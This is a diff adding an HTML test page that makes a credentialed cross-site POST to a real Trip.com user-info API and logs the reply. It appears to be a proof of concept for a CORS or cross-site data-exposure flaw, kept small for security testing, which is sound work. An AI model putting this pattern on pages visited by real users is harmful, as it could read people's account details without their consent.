@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Trip.com Cross-Site Auth Test</h1>
+
+<script>
+const url = "https://pl.trip.com/restapi/soa2/27024/getUserInfo";
+
+const body = {
+  "locale":"pl-PL",
+  "accessCode":"IBUPCAUTEHNTICATE",
+  "head":{
+      "cid":"09034111315494429964",
+      "ctok":"",
+      "cver":"1.0",
+      "lang":"01",
+      "sid":"8888",
+      "syscode":"09",
+      "auth":"",
+      "xsid":"",
+      "extension":[],
+      "Locale":"pl-PL",
+      "Language":"pl",
+      "Currency":"USD",
+      "ClientID":"09034111315494429964"
+  }
+};
+
+fetch(url, {
+  method: "POST",
+  credentials: "include",              // <-- sends cookies cross-site
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(body)
+})
+.then(res => res.text())
+.then(console.log)
+.catch(console.error);
+</script>
+
+</body>
+</html>
